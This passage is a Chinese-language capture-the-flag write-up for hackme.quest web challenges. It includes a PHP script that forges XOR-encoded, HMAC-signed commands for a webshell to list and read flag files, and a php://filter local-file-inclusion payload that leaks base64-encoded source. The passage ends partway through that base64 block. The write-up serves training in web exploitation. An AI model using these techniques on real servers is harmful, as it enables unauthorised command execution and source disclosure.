</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>   header(<span style=color:#5af78e>&#39;Content-Type: text/plain&#39;</span>); 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>   <span style=color:#ff6ac1>return</span> <span style=color:#ff6ac1>!!</span>system(<span style=color:#ff5c57>$cmd</span>); 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>  } 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span> } 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span> <span style=color:#ff6ac1>return</span> <span style=color:#ff6ac1>false</span>; 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>} 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>fuck</span>() { 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span> <span style=color:#ff6ac1>print</span>(str_repeat(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, <span style=color:#ff9f43>4096</span>)); 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span> readfile(<span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;SCRIPT_FILENAME&#39;</span>]); 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>} 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>run() <span style=color:#ff6ac1>?:</span> fuck(); 
</span></span></code></pre></div><p>這支程式的流程很簡單，主要是傳入兩個<code>GET</code>，分別是代表要執行的指令<code>cmd</code>以及該指令的簽章<code>sig</code>。<br>但這個<code>cmd</code>並不是直接被執行，而是拿去跟經過<code>sha512</code>雜湊後的<code>$_SERVER['REMOTE_ADDR']</code>做<code>XOR</code>運算。(<code>$_SERVER['REMOTE_ADDR']</code>就是自己的<code>IP</code>)</p><p>而<code>cmd</code>的簽章是經過<code>hmac</code>(<code>sha512</code>)運算，使用的<code>key</code>則是由<code>$_SERVER['HTTP_USER_AGENT']</code>接著<code>sha1($_SERVER['HTTP_HOST'])</code>組成，意思是<code>http user agent</code>接著<code>domain</code>。<br>比對完簽章正確後，就會執行該命令，但執行的是經過<code>XOR</code>運算後的命令。</p><p>所以這題目的很明顯，就是要你讓傳入的<code>cmd</code>字串經過<code>XOR</code>運算後，變成要執行的指令。</p><p>我們需要先將我們要執行的命令與<code>hash('SHA512', $_SERVER['REMOTE_ADDR'])</code>經過<code>XOR</code>運算回去，再把結果作為<code>cmd</code>傳入，讓伺服器運算回指令。</p><hr><p>寫個腳本幫助使用吧(把<code>$ip</code>變數改成自己的公開<code>ip</code>)：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;ls&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff5c57>$domain</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;webshell.hackme.quest&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff5c57>$ip</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;You-Public-Ip&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;HTTP_USER_AGENT&#39;</span>] <span style=color:#ff6ac1>.</span> sha1(<span style=color:#ff5c57>$domain</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>] <span style=color:#ff6ac1>=</span> hash(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$ip</span>) <span style=color:#ff6ac1>^</span> <span style=color:#ff5c57>$cmd</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>] <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#ff6ac1>echo</span> <span style=color:#5af78e>&#34;https://</span><span style=color:#5af78e>$domain</span><span style=color:#5af78e>/?cmd=</span><span style=color:#5af78e>$cmd</span><span style=color:#5af78e>&amp;sig=</span><span style=color:#5af78e>$sig</span><span style=color:#5af78e>&#34;</span>;
</span></span></code></pre></div><p>輸出的那段網址就會是<code>payload</code>，訪問之後可以看到如下資訊，看起來有成功執行「<code>ls</code>」。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/36/2_hu696f6064905748bb393431d3d00a8bb7_7708_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/36/2_hu696f6064905748bb393431d3d00a8bb7_7708_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/36/2_hu696f6064905748bb393431d3d00a8bb7_7708_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/36/2_hu696f6064905748bb393431d3d00a8bb7_7708_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/36/2_hu696f6064905748bb393431d3d00a8bb7_7708_660x0_resize_box_3.png alt style=width:100%></figure></p><p>既然看到<code>flag</code>這個檔案了，那就直接<code>cat</code>它：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;cat flag&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff5c57>$domain</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;webshell.hackme.quest&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff5c57>$ip</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;You-Public-Ip&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;HTTP_USER_AGENT&#39;</span>] <span style=color:#ff6ac1>.</span> sha1(<span style=color:#ff5c57>$domain</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>] <span style=color:#ff6ac1>=</span> hash(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$ip</span>) <span style=color:#ff6ac1>^</span> <span style=color:#ff5c57>$cmd</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>] <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#ff6ac1>echo</span> <span style=color:#5af78e>&#34;https://</span><span style=color:#5af78e>$domain</span><span style=color:#5af78e>/?cmd=</span><span style=color:#5af78e>$cmd</span><span style=color:#5af78e>&amp;sig=</span><span style=color:#5af78e>$sig</span><span style=color:#5af78e>&#34;</span>;
</span></span></code></pre></div><p><del>然後你就被耍了$%^&*</del></p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/36/3_hu6502c7482f80d45c45ed02788d104326_2392_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/36/3_hu6502c7482f80d45c45ed02788d104326_2392_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/36/3_hu6502c7482f80d45c45ed02788d104326_2392_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/36/3_hu6502c7482f80d45c45ed02788d104326_2392_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/36/3_hu6502c7482f80d45c45ed02788d104326_2392_660x0_resize_box_3.png alt style=width:100%></figure></p><p>看看隱藏檔案：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;ls -al&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff5c57>$domain</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;webshell.hackme.quest&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff5c57>$ip</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;You-Public-Ip&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;HTTP_USER_AGENT&#39;</span>] <span style=color:#ff6ac1>.</span> sha1(<span style=color:#ff5c57>$domain</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>] <span style=color:#ff6ac1>=</span> hash(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$ip</span>) <span style=color:#ff6ac1>^</span> <span style=color:#ff5c57>$cmd</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>] <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#ff6ac1>echo</span> <span style=color:#5af78e>&#34;https://</span><span style=color:#5af78e>$domain</span><span style=color:#5af78e>/?cmd=</span><span style=color:#5af78e>$cmd</span><span style=color:#5af78e>&amp;sig=</span><span style=color:#5af78e>$sig</span><span style=color:#5af78e>&#34;</span>;
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/36/4_hu14dfb4c885152739f2d864250a2665c9_48456_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/36/4_hu14dfb4c885152739f2d864250a2665c9_48456_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/36/4_hu14dfb4c885152739f2d864250a2665c9_48456_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/36/4_hu14dfb4c885152739f2d864250a2665c9_48456_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/36/4_hu14dfb4c885152739f2d864250a2665c9_48456_660x0_resize_box_3.png alt style=width:100%></figure></p><p>發現可疑的檔案「<code>.htflag</code>」，<code>cat</code>它：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;cat .htflag&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff5c57>$domain</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;webshell.hackme.quest&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff5c57>$ip</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;You-Public-Ip&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;HTTP_USER_AGENT&#39;</span>] <span style=color:#ff6ac1>.</span> sha1(<span style=color:#ff5c57>$domain</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>] <span style=color:#ff6ac1>=</span> hash(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$ip</span>) <span style=color:#ff6ac1>^</span> <span style=color:#ff5c57>$cmd</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>] <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>=</span> urlencode(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#ff6ac1>echo</span> <span style=color:#5af78e>&#34;https://</span><span style=color:#5af78e>$domain</span><span style=color:#5af78e>/?cmd=</span><span style=color:#5af78e>$cmd</span><span style=color:#5af78e>&amp;sig=</span><span style=color:#5af78e>$sig</span><span style=color:#5af78e>&#34;</span>;
</span></span></code></pre></div><p>Bingo：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/36/5_hu2b36e4fc0114287788db6cf4722d8a54_6342_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/36/5_hu2b36e4fc0114287788db6cf4722d8a54_6342_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/36/5_hu2b36e4fc0114287788db6cf4722d8a54_6342_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/36/5_hu2b36e4fc0114287788db6cf4722d8a54_6342_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/36/5_hu2b36e4fc0114287788db6cf4722d8a54_6342_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Flag <code>FLAG{Webshell? I only know sea shell~!}</code></p><hr><h2 class="relative group">37. <a href=https://command-executor.hackme.quest/ target=_blank>command-executor</a><div id=37-command-executorhttpscommand-executorhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#37-command-executorhttpscommand-executorhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Here&rsquo;s my useless developer assistant website, try to execute your own command!</p></blockquote><p>可以在上面的「<code>List files</code>」中看到當前目錄底下的檔案：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/1_huf13fc80f2cfba571538d9009948c1936_77131_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/1_huf13fc80f2cfba571538d9009948c1936_77131_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/1_huf13fc80f2cfba571538d9009948c1936_77131_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/1_huf13fc80f2cfba571538d9009948c1936_77131_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/1_huf13fc80f2cfba571538d9009948c1936_77131_660x0_resize_box_3.png alt style=width:100%></figure></p><p>嘗試一下後會發現，似乎能用的指令都在這邊了。<br>猜測可能是輸入指令後，會嘗試去找有沒有「<code>指令.php</code>」檔案，然後引入。</p><p>既然有引入的動作，那可能就有<code>LFI</code>，用解第<code>17</code>題的技巧來解這題：</p><pre tabindex=0><code>index.php?func=php://filter/read=convert.base64-encode/resource=index
</code></pre><p>成功拿到<code>index.php</code>的原始碼：</p><pre tabindex=0><code>PD9waHAKJHBhZ2VzID0gWwogICAgWydtYW4nLCAnTWFuJ10sCiAgICBbJ3VudGFyJywgJ1RhciBUZXN0ZXInXSwKICAgIFsnY21kJywgJ0NtZCBFeGVjJ10sCiAgICBbJ2xzJywgJ0xpc3QgZmlsZXMnXSwKXTsKCmZ1bmN0aW9uIGZ1Y2soJG1zZykgewogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvcGxhaW4nKTsKICAgIGVjaG8gJG1zZzsKICAgIGV4aXQ7Cn0KCiRibGFja19saXN0ID0gWwogICAgJ1wvZmxhZycsICdcKFwpXHMqXHtccyo6O1xzKlx9OycKXTsKCmZ1bmN0aW9uIHdhZigkYSkgewogICAgZ2xvYmFsICRibGFja19saXN0OwogICAgaWYoaXNfYXJyYXkoJGEpKSB7CiAgICAgICAgZm9yZWFjaCgkYSBhcyAka2V5ID0+ICR2YWwpIHsKICAgICAgICAgICAgd2FmKCRrZXkpOwogICAgICAgICAgICB3YWYoJHZhbCk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBmb3JlYWNoKCRibGFja19saXN0IGFzICRiKSB7CiAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi8kYi8iLCAkYSkgPT09IDEpIHsKICAgICAgICAgICAgICAgIGZ1Y2soIiRiIGRldGVjdGVkISBleGl0IG5vdy4iKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKd2FmKCRfU0VSVkVSKTsKd2FmKCRfR0VUKTsKd2FmKCRfUE9TVCk7CgpmdW5jdGlvbiBleGVjdXRlKCRjbWQsICRzaGVsbD0nYmFzaCcpIHsKICAgIHN5c3RlbShzcHJpbnRmKCclcyAtYyAlcycsICRzaGVsbCwgZXNjYXBlc2hlbGxhcmcoJGNtZCkpKTsKfQoKZm9yZWFjaCgkX1NFUlZFUiBhcyAka2V5ID0+ICR2YWwpIHsKICAgIGlmKHN1YnN0cigka2V5LCAwLCA1KSA9PT0gJ0hUVFBfJykgewogICAgICAgIHB1dGVudigiJGtleT0kdmFsIik7CiAgICB9Cn0KCiRwYWdlID0gJyc7CgppZihpc3NldCgkX0dFVFsnZnVuYyddKSkgewogICAgJHBhZ2UgPSAkX0dFVFsnZnVuYyddOwogICAgaWYoc3Ryc3RyKCRwYWdlLCAnLi4nKSAhPT0gZmFsc2UpIHsKICAgICAgICAkcGFnZSA9ICcnOwogICAgfQp9CgppZigkcGFnZSAmJiBzdHJsZW4oJHBhZ2UpID4gMCkgewogICAgdHJ5IHsKICAgICAgICBpbmNsdWRlKCIkcGFnZS5waHAiKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgfQp9CgpmdW5jdGlvbiByZW5kZXJfZGVmYXVsdCgpIHsgPz4KPHA+V2VsY29tZSB0byB1c2Ugb3VyIGRldmVsb3BlciBhc3Npc3RhbnQgc2VydmljZS4gV2UgcHJvdmlkZSBzZXJ2aWFsIHVzZWxlc3MgZmVhdHVyZXMgdG8gbWFrZSB5b3VyIGRldmVsb3BpbmcgbGlmZSBoYXJkZXIuPC9wPgoKPGltZyBzcmM9IndpbmRvd3MtcnVuLmpwZyIgYWx0PSJjb21tYW5kIGV4ZWN1dG9yIj4KPD9waHAgfQo/PjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+Q29tbWFuZCBFeGVjdXRvcjwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImJvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjb21pYy1uZXVlL2ZvbnQuY3NzIiBtZWRpYT0iYWxsIj4KICAgIDxzdHlsZT4KICAgICAgbmF2IHsgbWFyZ2luLWJvdHRvbTogMXJlbTsgfQogICAgICBpbWcgeyBtYXgtd2lkdGg6IDEwMCU7IH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctZGFyayBkLWZsZXgiPgogICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSJpbmR